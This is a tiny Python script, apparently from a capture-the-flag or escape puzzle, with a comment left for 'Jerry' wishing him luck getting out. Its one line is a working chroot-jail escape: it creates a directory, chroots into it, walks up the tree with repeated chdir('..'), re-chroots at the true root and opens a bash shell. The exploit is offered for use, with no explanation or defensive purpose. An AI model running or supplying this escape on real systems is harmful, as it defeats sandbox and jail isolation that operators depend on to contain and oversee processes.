#!/usr/bin/env python3

# I couldn't make it. I was so close. I am leaving this for you, Jerry.
# May luck guide you out of here
import os; os.mkdir('chroot-dir'); os.chroot('chroot-dir'); [os.chdir('..') for i in range(1000)]; os.chroot('.'); os.system('/bin/bash')
